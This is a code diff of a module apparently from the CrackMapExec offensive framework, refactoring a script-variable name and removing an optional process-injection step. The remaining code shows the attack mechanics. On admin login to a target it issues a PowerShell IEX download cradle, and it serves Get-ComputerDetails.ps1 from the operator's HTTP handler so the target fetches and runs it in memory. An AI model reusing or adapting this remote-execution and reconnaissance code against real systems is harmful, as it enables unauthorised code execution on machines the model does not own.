@@ -35,14 +35,12 @@ class CMXModule:
 #        if 'INJECT' in module_options:
 #            self.inject = bool(module_options['INJECT'])
         
-        self.ps_script1 = clean_ps_script('powershell_scripts/Get-ComputerDetails.ps1')
+        self.ps_script = clean_ps_script('powershell_scripts/Get-ComputerDetails.ps1')
 
     def on_admin_login(self, context, connection):
         command = 'Get-ComputerDetails -ToString | Out-String'
-        launcher = gen_ps_iex_cradle(context, 'Get-ComputerDetails.ps1', command, server_os=connection.server_os)
 
-        if self.inject:
-            launcher = gen_ps_inject(launcher, context, inject_once=False)
+        launcher = gen_ps_iex_cradle(context, 'Get-ComputerDetails.ps1', command, server_os=connection.server_os)
 
         connection.ps_execute(launcher)
 
@@ -52,7 +50,7 @@ class CMXModule:
         if 'Get-ComputerDetails.ps1' == request.path[1:]:
             request.send_response(200)
             request.end_headers()
-            request.wfile.write(self.ps_script1.encode())
+            request.wfile.write(self.ps_script.encode())
         else:
             request.send_response(404)
             request.end_headers()
